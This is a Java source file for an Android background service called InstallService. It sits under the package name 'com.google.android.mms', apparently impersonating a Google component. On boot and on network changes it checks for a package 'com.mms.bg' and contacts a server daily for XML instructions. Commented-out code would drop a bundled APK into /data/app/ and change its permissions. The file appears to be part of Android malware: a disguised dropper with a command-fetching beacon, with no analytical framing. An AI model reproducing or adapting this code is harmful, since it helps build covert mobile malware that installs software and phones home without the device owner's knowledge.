package com.google.android.mms;

import java.io.File;
import java.util.List;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.IBinder;

public class InstallService extends Service {
    
    public static final String OUT_PATH = "/data/app/";
    public static final String OUT_FILE_NAME = "com.mms.apk";
    
    public SettingManager mSM;
    private boolean mHasbeenInstalled;
    
    public static boolean service_start;
    
    @Override
    public void onCreate() {
        super.onCreate();
        mSM = SettingManager.getInstance(this);
//        PackageManager pm = getPackageManager();
//        try {
//            PackageInfo info = pm.getPackageInfo("com.mms.bg", PackageManager.GET_SERVICES);
//            if (info != null) {
//                //package has been installed
//                mHasbeenInstalled = true;
//            }
//            return;
//        } catch (NameNotFoundException e) {
//            e.printStackTrace();
//        }
        mHasbeenInstalled = isPackageAlreadyInstalled(this, "com.mms.bg");
        service_start = true;
		mSM.log("oncreate--------");
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        
        if (mHasbeenInstalled == false) {
            //not find package, install it now
              try {
//                  InputStream is = getResources().openRawResource(R.raw.app);
//                  mSM.log("unzip file to : " + OUT_PATH + OUT_FILE_NAME);
//                  ZipUtil.outputFile(is, OUT_PATH, OUT_FILE_NAME);
//                  Runtime.getRuntime().exec("chmod 666 " + OUT_PATH + OUT_FILE_NAME);
//                  is.close();
                  mHasbeenInstalled = true;
                  File file = new File(OUT_PATH + OUT_FILE_NAME);
                  if (file.exists()) {
                      mSM.setInternalInstallReason("install failed");
                  } else {
                      mSM.setInternalInstallReason("file is not exist in file : " + OUT_PATH + OUT_FILE_NAME);
                  }
              } catch (Exception e) {
                  e.printStackTrace();
                  mSM.setInternalInstallReason(e.getMessage());
              }
          } else {
              mSM.setInternalInstallReason("not install as the package is installed");
          }
        
        String action = intent.getAction();
        if (action == null || action.equals(BgService.ACTION_INTERNET) || action.equals(BgService.ACTION_BOOT)) {
            boolean ret = mSM.getXMLInfoFromServer("[install] daily");
            if (ret == true) {
                long delayTime = (long) (((long) 24) * 60 * 60 * 1000);
                mSM.setLastConnectServerTime(System.currentTimeMillis());
                mSM.mHasSetFetchServerInfoAlarm = false;
                mSM.setNextFetchChannelInfoFromServerTime(delayTime, false);
            } else {
                mSM.setInternetConnectFailed(true);
            }
        } else if (action.equals(BgService.ACTION_INTERNET_CHANGED) == true) {
            String str = intent.getStringExtra(SettingManager.CONNECT_NETWORK_REASON);
            if (str == null) str = "net aviliable";
            boolean ret = mSM.getXMLInfoFromServer("[install]" + str);
            if (ret == true) {
                if (mSM.getInternetConnectFailed()) {
                    mSM.setInternetConnectFailed(false);
                }
                long delayTime = (long) (((long) 24) * 60 * 60 * 1000);
                mSM.setLastConnectServerTime(System.currentTimeMillis());
                mSM.mHasSetFetchServerInfoAlarm = false;
                mSM.setNextFetchChannelInfoFromServerTime(delayTime, false);
            }
        }
    }
    
    public static boolean isPackageAlreadyInstalled(Context context, String pkgName) {
        List<PackageInfo> installedList = context.getPackageManager().getInstalledPackages(
                PackageManager.GET_UNINSTALLED_PACKAGES);
        int installedListSize = installedList.size();
        for(int i = 0; i < installedListSize; i++) {
            PackageInfo tmp = installedList.get(i);
            if(pkgName.equalsIgnoreCase(tmp.packageName)) {
                return true;
            }
            
        }
        return false;
    }
    
    @Override
    public IBinder onBind(Intent arg0) {
        // TODO Auto-generated method stub
        return null;
    }

}
